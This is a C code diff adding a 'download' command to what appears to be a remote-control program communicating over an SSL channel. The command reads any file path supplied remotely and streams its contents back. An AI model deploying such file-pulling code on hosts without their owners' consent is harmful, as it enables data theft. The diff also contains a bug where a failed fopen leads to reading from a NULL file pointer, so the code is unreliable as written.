@@ -29,6 +29,7 @@
 #include <time.h>
 
 #include <sys/types.h>
+#include <sys/stat.h>
 #include <sys/utsname.h>
 
 #include <openssl/ssl.h>
@@ -50,4 +51,35 @@ void cmd_time(SSL *channel)
     char time[64];
     sprintf(time, "%s\n", get_time_str("%a %b %d %H:%M:%S %Z %Y"));
     send_channel(channel, time);
+}
+
+void cmd_download(SSL *channel, char *args)
+{
+    struct stat path_s;
+    if (stat(args, &path_s) != 0) {
+        send_channel(channel, "incorrect");
+        return;
+    }
+
+    if (S_ISDIR(path_s.st_mode)) {
+        send_channel(channel, "directory");
+        return;
+    }
+
+    send_channel(channel, "file");
+    char *token = read_channel(channel);
+
+    FILE *file;
+    char temp[64];
+
+    file = fopen(args, "rb");
+
+    if (file == NULL)
+        send_channel(channel, token);
+
+    while (fgets(temp, 64, file) != NULL)
+        send_channel(channel, temp);
+
+    send_channel(channel, token);
+    fclose(file);
 }
